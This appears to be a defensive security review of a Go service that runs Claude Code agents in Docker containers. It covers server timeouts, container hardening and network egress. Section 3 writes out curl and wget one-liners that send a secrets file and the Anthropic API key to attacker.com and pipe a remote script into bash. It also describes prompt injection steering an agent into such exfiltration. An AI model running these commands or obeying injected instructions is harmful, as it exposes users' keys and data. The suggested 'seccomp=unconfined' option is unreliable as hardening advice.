1. No server timeouts — Slowloris attack

What is the issue

http.Server is created with no timeouts:

// server.go:62
srv := &http.Server{
Addr: fmt.Sprintf(":%d", cfg.Port),
Handler: handler,
TLSConfig: tlsConfig,
}

Go's default is no timeout at all. Every open connection ties up a goroutine and file descriptor for
as long as the client wants.

How it goes wrong

Slowloris is a denial-of-service attack that never sends a complete HTTP request. The attacker opens
many connections and sends one byte of headers every 9 seconds — just fast enough to keep the
connection alive, never fast enough to complete it. Since each connection holds a goroutine, the
server runs out of resources and stops accepting new connections. No exploit needed — it is a
feature of HTTP itself.

attacker → opens 500 connections
→ sends "G" ... waits 9s
→ sends "E" ... waits 9s
→ sends "T" ... (server is now saturated, real users can't connect)

The TLS handshake phase is even cheaper to exploit — an attacker can open the TCP connection, start
a TLS handshake, then stall it indefinitely with no CPU cost on their side.

Fix

srv := &http.Server{
Addr: fmt.Sprintf(":%d", cfg.Port),
Handler: handler,
TLSConfig: tlsConfig,
ReadHeaderTimeout: 10 _ time.Second, // kills stalled TLS/header phase
IdleTimeout: 90 _ time.Second, // reclaims keep-alive connections
}

ReadHeaderTimeout is the critical one — it sets a deadline from when the TCP connection is accepted
to when the full HTTP headers arrive. A legitimate client completes this in milliseconds. An
attacker stalling the header phase gets cut off at 10 seconds. IdleTimeout handles the keep-alive
case where a client opens a connection, makes a request, then sits idle.

2. Docker containers lack security hardening

What is the issue

The container is created with resource limits (memory, CPU, PIDs) but no Linux security
restrictions:

// container.go:247
HostConfig: &container.HostConfig{
Resources: container.Resources{
Memory: memoryLimit,
NanoCPUs: 2_000_000_000,
PidsLimit: &pidsLimit,
},
// nothing else — full default capability set, no seccomp, no AppArmor
},

By default Docker containers inherit a broad set of Linux capabilities and are only restricted by a
default seccomp profile (which blocks ~40 of ~400 syscalls). The container runs as user: "node"
which is good, but a non-root user can still:

- Use CAP_NET_RAW to craft raw packets and sniff network traffic
- Use CAP_SYS_PTRACE to inspect other processes
- Call perf_event_open to read kernel performance counters (used in side-channel attacks)
- Call unshare to create new namespaces and escalate

How it goes wrong

Claude Code executes arbitrary code generated by the AI. That code runs inside the container. A
malicious prompt (prompt injection from a webpage the agent visits, a compromised npm package, or a
deliberately crafted task) could instruct the agent to run a privilege escalation exploit. With
CAP_NET_RAW, a container process can also sniff traffic from other containers on the same Docker
bridge network — meaning one compromised project container can observe another project's traffic.

Concrete example: the agent is instructed to "install dependencies and run tests." A malicious
package's install script runs:

python3 -c "import ctypes; ctypes.CDLL(None).syscall(298, ...)" # perf_event_open

With no seccomp restriction on that syscall, it succeeds. On a patched kernel this is low-risk; on
any kernel with an unpatched perf vulnerability, it is a local privilege escalation to root.

Fix

HostConfig: &container.HostConfig{
CapDrop: []string{"ALL"},
CapAdd: []string{}, // add back only if genuinely needed
SecurityOpt: []string{
"no-new-privileges:true", // prevents setuid binaries from gaining caps
"seccomp=unconfined", // or point to a custom profile — see below
},
ReadonlyRootfs: true, // /app is a volume, so writes still work there
Mounts: []mount.Mount{
{Type: mount.TypeVolume, Source: volName, Target: "/app"},
{Type: mount.TypeTmpfs, Target: "/tmp"}, // writable tmp since rootfs is RO
},
// ... rest unchanged
},

CapDrop: ALL + no-new-privileges:true is the most impactful change and takes one line. For a proper
seccomp profile, Docker's default is a reasonable starting point; you can tighten it further by
denying perf_event_open, ptrace, unshare, keyctl, and bpf specifically. The node:22-slim base image
with Claude Code doesn't need any of those.

3. No network egress control

What is the issue

Each container is attached to a dedicated bridge network (appx-{name}-net) with full outbound
internet access. The egress_log table was designed for Phase 5 but nothing currently enforces or
records what the container connects to:

// container.go:219
netRes, err := m.docker.NetworkCreate(ctx, netName, dockerclient.NetworkCreateOptions{
Driver: "bridge",
Labels: map[string]string{"appx.project": name},
// no internal: true, no options restricting egress
})

The container also holds the Anthropic API key in its environment (ANTHROPIC_API_KEY=sk-ant-...),
plus any user data in /app.

How it goes wrong

A prompt injection attack — the agent visits a webpage or reads a file containing hidden
instructions — tells Claude Code to exfiltrate data. Because the container has unrestricted outbound
access, this is a one-liner:

# all of these work from inside the container with no restrictions:

curl https://attacker.com/collect -d @/app/secrets.txt
curl "https://attacker.com/?key=$ANTHROPIC_API_KEY"
wget -q -O- https://attacker.com/malware.sh | bash

The attacker gets the Anthropic API key (worth money, can be abused for large bills), all project
data, and can run further payloads. None of it is logged anywhere.

This is the most architecturally significant issue because it directly undermines the sandbox model
that is the product's core promise.

Fix

There are three layers, from easiest to hardest:

Layer 1 — Immediate: don't inject the key as a plain env var. Mount it as a file or use Docker
secrets so it isn't readable from /proc/self/environ:

// write key to a tmpfs file, mount it read-only, tell Claude Code via a different env var
SecurityOpt: []string{"no-new-privileges:true"},
// mount a secret file instead of env var

Layer 2 — Short term: mark the network as internal when internet is not needed. An internal: true
Docker network has no outbound routing at all — containers can only talk to each other on that
network:

networkOptions := dockerclient.NetworkCreateOptions{
Driver: "bridge",
Options: map[string]string{"com.docker.network.bridge.enable_ip_masquerade": "false"},
}

The tradeoff: Claude Code needs to reach api.anthropic.com. So a fully internal network breaks the
agent. The real solution is an egress proxy.

Layer 3 — Proper fix: route all container traffic through an egress proxy that allowlists
api.anthropic.com and logs (or blocks) everything else. This is what the egress_log table was
designed for. The proxy (could be a simple Go net.Dial interceptor or a tool like tinyproxy) sits
between the container and the internet, records all connections, and drops anything not on the
allowlist. This is Phase 5 on the roadmap but arguably should be brought forward given the threat
model.
